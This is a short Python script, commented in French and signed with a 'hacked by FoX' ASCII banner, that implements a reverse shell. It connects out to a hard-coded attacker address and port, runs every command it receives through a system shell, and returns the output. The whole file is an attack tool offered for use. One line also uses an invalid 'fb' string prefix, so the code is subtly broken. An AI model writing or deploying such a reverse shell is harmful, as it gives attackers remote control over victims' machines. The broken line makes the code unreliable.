import socket
import subprocess
import os
banner = fr'''

     __                  __               ___
    |  |_______    ____ |  | __ ____   __| _/
    |  |  \\__  \ _/ ___\|  |/ // __ \ / __ | 
    |   Y  \/ __ \\  \___|    <\  ___// /_/ | 
    |___|  (____  /\___  >__|_ \\___  >____ | 
         \/     \/     \/     \/    \/     \/ 
    ___            ___________   ____  ___    
    \_ |__ ___ __  \_   _____/___\   \/  /    
     | __ <   |  |  |    __)/  _ \\     /     
     | \_\ \___  |  |     \(  <_> )     \     
     |___  / ____|  \___  / \____/___/\  \    
         \/\/           \/             \_/   

'''
# Définissez l'adresse IP et le port de l'attaquant
HOST = '192.168.1.128'
PORT = 4444

# Créez un objet socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Connectez-vous à la machine de l'attaquant
s.connect((HOST, PORT))

# Envoyez un message à l'attaquant pour confirmer la connexion
s.send(bytes('Connecté au shell inverse!', 'utf-8'))

# Ouvrez un shell interactif
while True:
    # Recevez une commande de l'attaquant
    commande = s.recv(1024).decode('utf-8')

    # Si la commande est 'exit', sortez de la boucle
    if commande == 'exit':
        break

    # Exécutez la commande et capturez la sortie
    try:
        output = subprocess.check_output(commande, shell=True, stderr=subprocess.STDOUT)
        s.send(output)
    except Exception as e:
        s.send(str(e).encode('utf-8'))

    # Envoyez un prompt pour indiquer que le shell est prêt à recevoir une nouvelle commande
    s.send(fb'{banner}')
    s.send(b'$ ')

# Fermez la connexion
s.close()
